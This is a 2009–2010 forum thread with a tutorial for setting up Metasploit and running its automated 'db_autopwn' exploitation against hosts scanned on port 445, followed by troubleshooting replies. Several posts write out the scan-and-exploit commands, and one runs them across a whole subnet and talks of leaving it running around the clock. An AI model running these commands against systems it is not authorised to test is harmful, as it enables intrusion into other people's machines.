---
title: "How to: metasploit with autopwn"
date: 2009-02-14
forum: Security
---

### Post by cosine352 on 2009-02-14
Metasploit provides useful information to people who perform penetration testing. To do the exploits automatically autopwn is useful. I do not know how good this thing works and I am also not an expert. I just gathered information from different places and want to share with you guys. 

1) Firat install Ruby
> sudo apt-get install ruby libruby rdoc
sudo apt-get install libyaml-ruby

sudo apt-get install libzlib-ruby
sudo apt-get install libopenssl-ruby
sudo apt-get install libdl-ruby
sudo apt-get install libreadline-ruby
sudo apt-get install libiconv-ruby
sudo apt-get install rubygems

2) Install PostgreSQL

> sudo apt-get install postgresql postgresql-client postgresql-contrib
sudo apt-get install pgadmin3

3) Set up the password for postgres

> sudo su postgres -c psql
ALTER USER postgres WITH PASSWORD 'your password';

\q


sudo passwd -d postgres
sudo su postgres -c passwd

Now enter the same password that you used previously('your password').


3) need to use the gem command to install ActiveRecord and the PostgreSQL driver for Ruby. 

> sudo gem1.8 install activerecord
sudo gem1.8 install postgres

IF YOU CAN NOT INSTALL postgres probably you need to install ruby1.8-dev

> sudo apt-get install ruby1.8-dev

IF YOU STILL CAN NOT INSTALL POSTGRES, YOU NEED THE libpq-dev 
> sudo apt-get install libpq-dev

Now rerun
> sudo gem1.8 install postgres

4)download the Unix tarball from [Framework Website]("http://metasploit.com/framework/download") and extract it to the directory of your choice.

5) Extract it and go to the Framework directory and from there run
> su postgres

Enter the password ('your password') you have set before. 

6) Now run the metasploit
> ./msfconsole
load db_postgres
db_create test
db_hosts

at the last command you should not get any error

> db_nmap IP ADDRESS TO TEST -p 445

This will load the host and will use the exploits for open port 445

check that you are doing it for the correct ip
> db_hosts

DO NOT USE IT TO OTHER IP THAT YOU DO NOT HAVE AUTHORISATION. THIS IS TO DO A SECURITY TEST ON THE MACHINES YOU ARE AUTHORISED.  

start the exploitation

> db_autopwn -t -p -e -s -b

to know the meaning of this type 

> db_autopwn

This will show you the options used in the previous command

if suspenseful it will generate some active sessions

> sessions -l

To use an active session do this. Where 'i' is the number of the session. 
> sessions -i

---

### Post by trigsenior on 2009-02-28
Many thanks for your post extremely helpful.

Might also want to cover scanning/exploiting multiple hosts using nmap or nessus.
Copy paste from "http://blog.metasploit.com/2006/09/metasploit-30-automated-exploitation.html"

"You can either import an existing Nessus NBE file using the db_import_nessus_nbe command, import an existing Nmap XML output file using the db_import_nmap_xml command, or use the db_nmap command to populate the database. The benefit of using a Nessus NBE file is that it provides data for the cross-referencing mode (-x) of db_autopwn. The benefit of using Nmap data is that you can quickly attack a large group of systems without having to run a complete vulnerability scan, but you will miss vulnerabilities that are not on the default port of the associated Metasploit module."

---

### Post by cayaman on 2009-03-05
Thanks for the tutorial.

I have just a litle problem. How come when I do the db_nmap command I received " an invalid command" message error:


[B]msf > db_nmap_ 192.168.0.197 -p 445
[-] Unknown command: db_nmap_.
msf > [/B]

Can you help me ?

BTW nmap Is already installed on my machine.

---

### Post by cosine352 on 2009-03-05
> **cayaman said:**
> Thanks for the tutorial.

I have just a litle problem. How come when I do the db_nmap command I received " an invalid command" message error:


[B]msf > db_nmap_ 192.168.0.197 -p 445
[-] Unknown command: db_nmap_.
msf > [/B]

Can you help me ?

BTW nmap Is already installed on my machine.


remove the '_' 
correct command is
> msf > db_nmap 192.168.0.197 -p 445

---

### Post by cayaman on 2009-03-06
Thanks !  My mistake ! I need more sleep I guess...;)

---

### Post by sertug84 on 2009-03-15
Hi i am new in this forum. Actually i am trying to find answer to my problem and i am very tired about that. Here is my last hope. &#304; did everything but i am still getting this error and could not find what i will do :( please help.

```
msf > db_autopwn -e
[-] Error while running command db_autopwn: unknown type 'int32le' for PacketFu::PcapHeader

Call stack:
/usr/local/msf/framework-3.2/lib/packetfu/pcap.rb:9
/usr/local/lib/site_ruby/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
/usr/local/lib/site_ruby/1.8/rubygems/custom_require.rb:31:in `require'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:510:in `require'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:355:in `new_constants_in'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:510:in `require'
/usr/local/msf/framework-3.2/lib/packetfu.rb:38
/usr/local/lib/site_ruby/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
/usr/local/lib/site_ruby/1.8/rubygems/custom_require.rb:31:in `require'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:510:in `require'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:355:in `new_constants_in'
/usr/local/msf/framework-3.2/data/msfweb/vendor/rails/activerecord/lib/../../activesupport/lib/active_support/dependencies.rb:510:in `require'
/usr/local/msf/framework-3.2/lib/msf/core/exploit/capture.rb:30:in `initialize'
(eval):37:in `initialize'
/usr/local/msf/framework-3.2/lib/msf/ui/console/command_dispatcher/db.rb:215:in `new'
/usr/local/msf/framework-3.2/lib/msf/ui/console/command_dispatcher/db.rb:215:in `cmd_db_autopwn'
/usr/local/msf/framework-3.2/lib/msf/core/module_manager.rb:234:in `call'
/usr/local/msf/framework-3.2/lib/msf/core/module_manager.rb:234:in `each_module_list'
/usr/local/msf/framework-3.2/lib/msf/core/module_manager.rb:207:in `each'
/usr/local/msf/framework-3.2/lib/msf/core/module_manager.rb:207:in `each_module_list'
/usr/local/msf/framework-3.2/lib/msf/core/module_manager.rb:124:in `each_module'
/usr/local/msf/framework-3.2/lib/msf/ui/console/command_dispatcher/db.rb:214:in `cmd_db_autopwn'
/usr/local/msf/framework-3.2/lib/msf/ui/console/command_dispatcher/db.rb:212:in `each'
/usr/local/msf/framework-3.2/lib/msf/ui/console/command_dispatcher/db.rb:212:in `cmd_db_autopwn'
/usr/local/msf/framework-3.2/lib/rex/ui/text/dispatcher_shell.rb:234:in `send'
/usr/local/msf/framework-3.2/lib/rex/ui/text/dispatcher_shell.rb:234:in `run_command'
/usr/local/msf/framework-3.2/lib/rex/ui/text/dispatcher_shell.rb:196:in `run_single'
/usr/local/msf/framework-3.2/lib/rex/ui/text/dispatcher_shell.rb:191:in `each'
/usr/local/msf/framework-3.2/lib/rex/ui/text/dispatcher_shell.rb:191:in `run_single'
/usr/local/msf/framework-3.2/lib/rex/ui/text/shell.rb:127:in `run'
/usr/local/bin/msfconsole:78

```

---

### Post by perillux on 2009-03-27
Everything installed great and it appeared to run good when I ran autopwn but, I get an error that it can't detect the exact language pack used by the target system, and it just stops on that exploit.

Is there any way I can fix this?  Or does anyone know what would cause me to not be able to detect the language pack?
Also, is there any way to tell metasploit that it is English?

[EDIT]
The target machine uses  Windows XP SP2
[/EDIT]

---

### Post by Synchr0 on 2009-04-21
oot@bt:/etc/postgresql/8.3/main# sudo su postgres -c psql
psql: could not connect to server: No such file or directory
        Is the server running locally and accepting
        connections on Unix domain socket "/var/run/postgresql/.s.PGSQL.5432"?


Any idea ?
Im using backtrack 4 ,was trying to install newer version of postgres i actually managed to even run a sql server but still getting the same error * Is the server running locally and accepting
        connections on Unix domain socket "/var/run/postgresql/.s.PGSQL.5432"? *

in another ocasion ... 

Please help Thanx

---

### Post by kballero on 2009-06-12
PacketFu
A mid-level packet manipulation library for Ruby (author Tod Beardsley)
[http://code.google.com/p/packetfu/](http://code.google.com/p/packetfu/)

HowTo Install:
[http://ubuntuforums.org/showthread.php?p=7447418#post7447418](http://ubuntuforums.org/showthread.php?p=7447418#post7447418)

---

### Post by lord-of-war on 2009-06-30
im getting this error when i run it 

 Exploit failed: DCERPC FAULT => nca_s_fault_ndr


can anybody help me with it?

---

### Post by FlapBags on 2009-12-26
THIS is what happens when you follow this tutorial...
 
sudo: gem1.8: command not found <---RUBY=FAIL
 
sudo gem1.8 install activerecord <------FAIL (gem1.8 unknown command)
sudo gem1.8 install postgres <------FAIL (gem1.8 unknown command)
 
Even after installing all the extra dev stuff he suggested it STILL FAILS
 
Unknown command: db_nmap.
Unknown command: db_hosts. <-----FAIL Might wanna re-edit your tut and explain what this is and how to fix it
 
Any Idea why the FAILTACULAR???
 
heres a screenshot of the super FAIL in action. This is on Ubuntu Server Hardy.
 
[img][http://i49.tinypic.com/vxdw05.png](http://i49.tinypic.com/vxdw05.png)[/img] no IMG code=GAY
 
 
Forgive me if I come off as pompous, Im a stinking n00b and this is really making me want to throw a pie at the face of this tut author. And a baseball bat to my monitor as Ive spent almost 6 hours working up to this FAIL. Either the files have changed since this tut was written or this is what I would consider an outdated tut that no longer is relevant.

---

### Post by __p1n__ on 2009-12-26
If you want to attempt a blind exploit without knowing what you're doing why not just be a total script kiddie and use fasttrack (end-to-end autopwn automation).  It's included on the bt4 pre-final.  In the absence of a particular ubuntu vuln to either test-for or harden-against this thread is probably not on-point vis-a-vis this forum.

---

### Post by FlapBags on 2009-12-26
> **__p1n__ said:**
> If you want to attempt a blind exploit without knowing what you're doing why not just be a total script kiddie and use fasttrack (end-to-end autopwn automation). It's included on the bt4 pre-final. In the absence of a particular ubuntu vuln to either test-for or harden-against this thread is probably not on-point vis-a-vis this forum.
 
BT4 is the failure as well, doesnt load drivers for my ATHEROS wireless or my onboard ethernet, BT3 does both fine.  I dont know what they did with drivers in BT4 but they went the wrong direction.
 
Why would I want to load into a live cd for a one time usage of Autopwn, lol. Id rather load it onto my webserver and let it run 24/7.
 
BTW my little white hat friend. I got it to work.
 
msf > load db_sqlite3
msf > db_create mynetwork
msf > db_nmap -sS -T4 -O x.x.x.0/24
db_autopwn -p -e

---

### Post by CuriousKitten on 2009-12-28
Metasploit, BT, Ruby...

Wow, this little skiddie whines about everything not working on his system. 

Perhaps if used less time posting messages about how everything fails for you and more time reading or posting legitimate questions, you might find you would be able to accomplish these things without getting as frustrated.

---

### Post by __p1n__ on 2009-12-28
> **FlapBags said:**
>  msf > load db_sqlite3
msf > db_create mynetwork
msf > db_nmap -sS -T4 -O x.x.x.0/24
db_autopwn -p -e

  You're using an outdated version of msf my skiddie friend; the db_sqlite3 module is deprecated since this is part of the current core functionality.  Re BT4 I'm not certain why you assumed that you need to use it as a livecd.  Fasttrack (which provides both a gui and end-to-end db_autopwn automation making it perfect for skiddies imho) is included in the distro, a distro that virtually all skiddies possess but one whose content on the whole is unfamiliar to them.  Have fun.

---

### Post by hakermania on 2010-05-02
Alright for me.
No errors.
It's a matter of time to hack my other WinXpSp2...!

---

### Post by annetote on 2010-06-25
hi all,
i have problems in db_autopwn.
i used metasploit 3.4.1 in ubuntu
and target host is win xp sp2

all the command that i run works great.
but i have some problem when i run 

db_autopwn -p -t -x -e
it appear this:
The autopwn command has completed with 0 sessions

but the target hosts has lots of high vulnerabilities.
i scan all the vulnerabilities using nessus and nmap.
there are more than 100 module that match with the exploit.

so what should i do.
because the sessions do not created.

really need help
:confused:

---

### Post by 98cwitr on 2010-07-13
if anyone could provide a link for using sqlite3 instead of postgres or why postgres is better I'd appreciate it.

nm, metasploit provides and excellent how-to [http://www.metasploit.com/redmine/projects/framework/wiki/Install_Ubuntu](http://www.metasploit.com/redmine/projects/framework/wiki/Install_Ubuntu)

---

